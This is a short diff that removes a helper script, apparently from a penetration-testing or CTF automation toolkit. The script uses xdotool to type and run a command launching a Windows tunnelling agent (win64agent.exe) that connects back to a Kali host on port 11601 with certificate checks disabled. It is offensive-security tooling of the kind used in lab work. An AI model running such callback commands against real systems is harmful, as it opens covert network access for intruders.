@@ -1,6 +1,0 @@
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip
-
-com="./win64agent.exe -connect ${KALI_IP}:11601 -ignore-cert"
-
-xdotool type --delay 10 "${com}"
-xdotool key Return
